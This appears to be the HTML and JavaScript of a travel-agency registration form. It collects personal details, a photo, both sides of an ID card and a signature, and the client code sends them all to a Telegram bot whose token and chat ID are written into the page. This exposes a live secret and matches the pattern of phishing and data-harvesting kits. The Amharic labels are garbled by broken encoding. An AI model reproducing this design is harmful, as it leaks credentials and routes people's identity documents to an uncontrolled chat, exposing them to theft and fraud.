<!DOCTYPE html>
<html lang="am">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>WILLY TRAVEL AGENCY - Mobile Form</title>

<style>
  :root{--accent:#0a8d34;--danger:#e63939;}

  body{
    font-family:Arial,Helvetica,sans-serif;
    background:#f2f2f2;
    margin:0;padding:12px;
  }

  .container{
    max-width:760px;margin:auto;background:#fff;
    padding:14px;border-radius:10px;
    box-shadow:0 6px 20px rgba(0,0,0,.08);
  }

  .flag{display:block;margin:6px auto;width:110px}
  h1{text-align:center;margin:6px 0;font-size:20px;font-weight:700}

  label{font-weight:700;margin-top:8px;display:block}
  input,select,button{
    font-size:16px;padding:10px;
    border-radius:8px;border:1px solid #cfcfcf;
    box-sizing:border-box;
  }

  .row{display:flex;gap:10px;flex-direction:column}
  @media(min-width:640px){.row.two{flex-direction:row}}

  .img-preview{
    width:100%;max-width:220px;height:160px;
    object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px
  }

  .section{
    background:#f7f7f7;padding:8px;
    border-radius:6px;margin-top:14px;font-weight:700
  }

  canvas{
    width:100%;height:200px;border:2px solid #333;
    border-radius:6px;touch-action:none;background:#fff;display:block
  }

  .controls{display:flex;gap:8px;margin-top:8px}
  .controls button{flex:1}

  .btn-primary{background:var(--accent);color:#fff;border:none}
  .btn-clear{background:var(--danger);color:#fff;border:none}
  .small-note{font-size:13px;color:#666;margin-top:6px}

  /* ===== PROCESSING LOADER ===== */
  #processing{
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,.7);display:none;align-items:center;
    justify-content:center;flex-direction:column;z-index:9999;
  }

  .loader{
    width:80px;height:80px;
    border:8px solid #ffffff55;
    border-top:8px solid var(--accent);
    border-radius:50%;
    animation:spin 1s linear infinite;
  }

  @keyframes spin{
    0%{transform:rotate(0deg)}
    100%{transform:rotate(360deg)}
  }

  .loader-text{
    margin-top:18px;
    color:#fff;font-size:20px;font-weight:700;
    animation:pulse 1.2s infinite;
    text-align:center;
  }

  @keyframes pulse{
    0%{opacity:0.5}
    100%{opacity:1}
  }

  /* ===== SUBMISSION POPUP ===== */
  #popupOverlay{
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,.65);
    display:none;align-items:center;justify-content:center;
    z-index:999;
  }

  #popupBox{
    width:86%;max-width:360px;background:#fff;border-radius:14px;
    padding:20px;text-align:center;
    animation:popScale .4s ease;
  }

  @keyframes popScale{
    0%{transform:scale(0.5);opacity:0}
    100%{transform:scale(1);opacity:1}
  }

  .popup-title{
    font-size:20px;font-weight:700;color:#0a8d34;
    margin-bottom:10px;
  }

  .popup-code{
    font-size:24px;font-weight:800;color:#004aad;
    margin:10px 0;
    animation:codeGlow 1.2s infinite alternate;
  }

  @keyframes codeGlow{
    from{opacity:0.5;transform:scale(1)}
    to{opacity:1;transform:scale(1.08)}
  }

  #closePopup{
    margin-top:14px;background:#0a8d34;color:#fff;
    padding:10px 20px;border-radius:8px;border:none;
    font-size:16px;
  }
</style>
</head>
<body>

<!-- PROCESSING LOADER -->
<div id="processing">
  <div class="loader"></div>
  <div class="loader-text">Processing your form...</div>
</div>

<div class="container">
  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">

  <h1>WILLY TRAVEL AGENCY</h1>

  <div class="row two">
    <div style="flex:1">
      <label>·çé·â∂ ·ä†·àµ·åà·â£ / Upload Photo</label>
      <input type="file" accept="image/*" id="photoInput">
      <img id="photoPreview" class="img-preview" style="display:none">
    </div>

    <div style="width:160px">
      <label>·âÄ·äï / Date</label>
      <input type="date" id="dateInput">
    </div>
  </div>

  <!-- Identity Section -->
  <div class="section">Identity of Registrant</div>

  <label>·àô·àâ ·àµ·àù / FULL NAME</label><input id="fullName">
  <label>·çÜ·â≥ / SEX</label>
  <select id="sex"><option>Male</option><option>Female</option></select>
  <label>·ä•·ãµ·àú / AGE</label><input id="age" type="number">
  <label>·àµ·àç·ä≠ ·âÅ·å•·à≠ / PHONE</label><input id="phone">
  <label>·ä†·ãµ·à´·àª / ADDRESS</label><input id="address">
  <label>·âÅ·àò·âµ / Height (cm)</label><input id="height" type="number">
  <label>·ä≠·â•·ã∞·âµ / Weight (kg)</label><input id="weight" type="number">

  <label>·ãà·à®·ã≥ / District</label><input id="district">
  <label>·âÄ·â†·àå / Kebele</label><input id="kebele">

  <label>·ã®·âµ·ãç·àç·ãµ ·âÄ·äï / Birth Date</label><input id="bod" type="date">
  <label>·ã®·âµ·ãç·àç·ãµ ·â¶·â≥ / Birth Place</label><input id="bop">

  <!-- Holder -->
  <div class="section">·ã®·â∞·ã´·ã´·ã• ·à∞·ãç / HOLDER NAME</div>
  <label>·àµ·àù / NAME</label><input id="holderName">
  <label>·àµ·àç·ä≠ / PHONE</label><input id="holderPhone">

  <!-- Signature -->
  <div class="section">Signature</div>
  <canvas id="signaturePad"></canvas>
  <div class="controls">
    <button class="btn-clear" id="clearBtn">Clear</button>
    <button class="btn-primary" id="previewBtn">Preview</button>
  </div>
  <img id="signaturePreview" class="img-preview" style="display:none">

  <!-- ID Upload -->
  <div class="section">ID Upload/ ·ã®·àò·â≥·ãà·âÇ·ã´ ·ã´·àµ·åà·â° </div>

  <label>ID Front</label><input type="file" accept="image/*" id="idFrontInput"><img id="idFrontPreview" class="img-preview" style="display:none">
  <label>ID Back</label><input type="file" accept="image/*" id="idBackInput"><img id="idBackPreview" class="img-preview" style="display:none">

  <button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
</div>

<!-- POPUP -->
<div id="popupOverlay">
  <div id="popupBox">
    <div class="popup-title">üéâ Your Form Was Submitted Successfully!</div>
    <div>Please save your unique registration code.</div>
    <div style="margin-top:10px;">Your Code:</div>
    <div id="uniqueCode" class="popup-code"></div>
    <button id="closePopup">OK</button>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);

/* Preview function */
function attachPreview(inputId,imgId){
  $(inputId).addEventListener("change",()=>{
    const f = $(inputId).files[0];
    if(!f){ $(imgId).style.display="none"; return; }
    $(imgId).src = URL.createObjectURL(f);
    $(imgId).style.display="block";
  });
}
attachPreview("photoInput","photoPreview");
attachPreview("idFrontInput","idFrontPreview");
attachPreview("idBackInput","idBackPreview");

/* Signature pad */
const canvas = $("signaturePad");
const ctx = canvas.getContext("2d");
let drawing = false;

function fitCanvas(){
  const rect = canvas.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;
  ctx.lineWidth = 2.5;
  ctx.lineCap = "round";
  ctx.strokeStyle = "#000";
}
fitCanvas();

canvas.addEventListener("pointerdown",e=>{
  drawing = true;
  ctx.beginPath();
  ctx.moveTo(e.offsetX,e.offsetY);
});
canvas.addEventListener("pointermove",e=>{
  if(!drawing) return;
  ctx.lineTo(e.offsetX,e.offsetY);
  ctx.stroke();
});
canvas.addEventListener("pointerup",()=>drawing=false);

$("clearBtn").onclick=()=>{
  ctx.clearRect(0,0,canvas.width,canvas.height);
  $("signaturePreview").style.display="none";
};

$("previewBtn").onclick=()=>{
  $("signaturePreview").src = canvas.toDataURL();
  $("signaturePreview").style.display="block";
};

/* Telegram Config */
const BOT = "8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
const CHAT = "8267646853";

async function sendText(text){
  return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id:CHAT, text })
  });
}

async function sendPhoto(file, caption=""){
  const fd = new FormData();
  fd.append("chat_id",CHAT);
  fd.append("photo",file);
  fd.append("caption",caption);
  return fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
    method:"POST",
    body:fd
  });
}

/* Submit */
$("submitBtn").onclick = async ()=>{

  const name = $("fullName").value.trim();
  if(!name){
    alert("Enter full name");
    return;
  }

  // Show processing loading animation
  $("processing").style.display = "flex";

  const code="WTA-"+(Math.floor(Math.random()*900000)+100000);
  $("uniqueCode").innerText = code;

  /* Attractive Message */
  let msg =
`üíö‚ú® *WILLY TRAVEL AGENCY ‚Äì NEW CLIENT FORM* ‚ú®üíö

üßæ *Registration Summary*
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
üë§ *Full Name:* ${$("fullName").value}
‚öß *Sex:* ${$("sex").value}
üéÇ *Age:* ${$("age").value}
üìû *Phone:* ${$("phone").value}
üè† *Address:* ${$("address").value}

üìè *Height:* ${$("height").value} cm
‚öñÔ∏è *Weight:* ${$("weight").value} kg

üèò *District:* ${$("district").value}
üè° *Kebele:* ${$("kebele").value}

üéÇ *Birth Date:* ${$("bod").value}
üìç *Birth Place:* ${$("bop").value}

üë• *Emergency Contact:*  
‚Ä¢ *Name:* ${$("holderName").value}  
‚Ä¢ *Phone:* ${$("holderPhone").value}

üîê *Unique Code:* ${code}

üì© *All images (Photo + ID + Signature) will arrive shortly‚Ä¶*
`;

  await sendText(msg);

  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"üì∏ User Photo");
  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ü™™ ID Front");
  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ü™™ ID Back");

  canvas.toBlob(async blob=>{
    if(blob) await sendPhoto(blob,"‚úçÔ∏è Signature");
  });

  // Hide processing + show success popup
  setTimeout(()=>{
    $("processing").style.display="none";
    $("popupOverlay").style.display = "flex";
  },2000);
};

$("closePopup").onclick = ()=>{
  $("popupOverlay").style.display="none";
};
</script>

</body>
</html>